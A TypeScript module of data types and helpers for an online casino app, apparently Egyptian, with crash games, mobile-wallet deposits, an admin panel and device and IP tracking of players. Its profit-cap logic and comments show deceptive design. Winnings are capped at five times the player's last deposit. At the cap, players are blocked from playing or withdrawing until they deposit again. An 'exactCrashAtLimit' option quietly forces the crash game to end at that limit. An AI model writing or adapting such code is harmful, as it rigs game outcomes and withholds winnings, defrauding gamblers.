export type Screen =
  | 'login'
  | 'register'
  | 'lobby'
  | 'crash'
  | 'apple_of_fortune'
  | 'gems_odyssey'
  | 'royal_hilo'
  | 'mundial'
  | 'four_aces'
  | 'deposit'
  | 'deposit_method'
  | 'withdraw'
  | 'history'
  | 'admin';

export type PaymentMethodType = 'vodafone' | 'etisalat' | 'orange';

export interface UserAccount {
  id: string; // Unique 5-6 digit user ID e.g. "84920"
  username: string;
  phone: string;
  email?: string;
  instagram?: string; // Player's Instagram username e.g. "@username"
  balance: number;
  isLoggedIn: boolean;
  registeredAt: number;
  totalDeposited?: number;
  totalWithdrawn?: number;
  role?: 'user' | 'admin';
  lastDepositAmount?: number;
  maxBalanceLimit?: number;
  customProfitLimit?: number;
  profitLimitEnabled?: boolean;
  forceLogout?: boolean;
  // Device tracking information
  deviceId?: string;
  deviceName?: string;
  deviceType?: 'mobile' | 'tablet' | 'desktop';
  deviceOS?: string;
  deviceBrowser?: string;
  screenRes?: string;
  ip?: string;
  lastActive?: number;
  lastLoginAt?: number;
  // Ban & Deletion status
  isBanned?: boolean;
  bannedAt?: number;
  banReason?: string;
}

export interface BannedRecord {
  id: string;
  userId?: string;
  phone?: string;
  deviceId?: string;
  deviceName?: string;
  username?: string;
  bannedAt: number;
  reason?: string;
}

export interface Transaction {
  id: string;
  userId: string;
  userName: string;
  userPhone: string;
  type: 'deposit' | 'withdraw' | 'win' | 'bet' | 'admin_adjustment';
  amount: number;
  method?: string;
  senderPhone?: string;
  phone?: string;
  referenceCode?: string;
  receiptImage?: string;
  status: 'completed' | 'pending' | 'rejected';
  timestamp: number;
  game?: string;
  multiplier?: number;
  note?: string;
}

export interface LiveBet {
  user: string;
  bet: number;
  odds?: number;
  win?: number;
  cashedOut: boolean;
  avatar?: string;
}

export interface AppleRowState {
  multiplier: number;
  selectedColumn: number | null;
  rottenIndex: number[];
  revealed: boolean[];
  status: 'locked' | 'active' | 'passed' | 'failed';
}

export interface AdminSettings {
  vodafoneNumber: string;
  etisalatNumber: string;
  orangeNumber: string;
  instapayNumber: string;
  instapayAccountName?: string;
  minDeposit: number;
  minWithdraw: number;
  platformName: string;
  autoApproveDeposits: boolean;
  instagramUsername?: string;
  instagramLink?: string;
  // Profit Limit & Exact Crash at Limit Settings (Controlled via admin.php / Admin Dashboard)
  enableProfitCap?: boolean; // Default true
  profitCapMultiplier?: number; // Default 5x (300 EGP -> 1500 EGP, 500 EGP -> 2500 EGP)
  profitCapBase?: 'last_deposit' | 'total_deposited'; // Default 'last_deposit'
  profitCapMessage?: string; // Default 'لقد وصلت إلى الحد الأقصى من الأرباح، يجب تشحن لإجراء عملية سحب أو لعب.'
  exactCrashAtLimit?: boolean; // Default true (يفرقع عنده بالضبط بهدوء عند الوصول للحد الأقصى)
}

export interface SupportMessage {
  id: string;
  sender: 'user' | 'admin';
  senderName: string;
  text: string;
  timestamp: number;
  image?: string;
  depositRefId?: string;
}

export interface SupportTicket {
  id: string;
  userId: string;
  userName: string;
  userPhone: string;
  subject: string;
  messages: SupportMessage[];
  status: 'open' | 'resolved';
  createdAt: number;
  updatedAt: number;
}

export interface ConnectedDeviceInfo {
  deviceId: string;
  deviceName: string;
  deviceType: string;
  deviceOS: string;
  deviceBrowser: string;
  screenRes: string;
  currentScreen?: string;
  userId?: string;
  username?: string;
  phone?: string;
  balance?: number;
  isOnline: boolean;
  lastSeen: number;
  connectedAt: number;
}

/**
 * Calculates the maximum allowable balance before requiring a new deposit.
 * Rules requested by user:
 * - Proportional to deposit amount by multiplier (default 5x):
 *   - 300 EGP deposit -> 1500 EGP limit
 *   - 500 EGP deposit -> 2500 EGP limit
 * - Once reached, player cannot play any game or withdraw until making a new deposit.
 */
export function calculateBalanceLimit(depositAmount: number, multiplier = 5): number {
  const mult = typeof multiplier === 'number' && multiplier > 0 ? multiplier : 5;
  if (depositAmount <= 0) return 1500;
  return Math.round(depositAmount * mult);
}

export function getEffectiveBalanceLimit(
  user?: Partial<UserAccount> | null,
  settings?: Partial<AdminSettings> | null
): number {
  if (!user) return 1500;
  // If admin set a custom manual limit override for this specific player via admin panel
  if (user.profitLimitEnabled && typeof user.customProfitLimit === 'number' && user.customProfitLimit > 0) {
    return user.customProfitLimit;
  }
  if (typeof user.maxBalanceLimit === 'number' && user.maxBalanceLimit > 0) {
    return user.maxBalanceLimit;
  }
  if (typeof user.customProfitLimit === 'number' && user.customProfitLimit > 0) {
    return user.customProfitLimit;
  }
  const mult = settings?.profitCapMultiplier && settings.profitCapMultiplier > 0 ? settings.profitCapMultiplier : 5;
  const baseMode = settings?.profitCapBase || 'last_deposit';

  let baseAmount = 0;
  if (baseMode === 'total_deposited' && typeof user.totalDeposited === 'number' && user.totalDeposited > 0) {
    baseAmount = user.totalDeposited;
  } else if (typeof user.lastDepositAmount === 'number' && user.lastDepositAmount > 0) {
    baseAmount = user.lastDepositAmount;
  } else if (typeof user.totalDeposited === 'number' && user.totalDeposited > 0) {
    baseAmount = user.totalDeposited;
  } else {
    baseAmount = 300; // Default sample deposit: 300 -> 1500
  }

  return calculateBalanceLimit(baseAmount, mult);
}

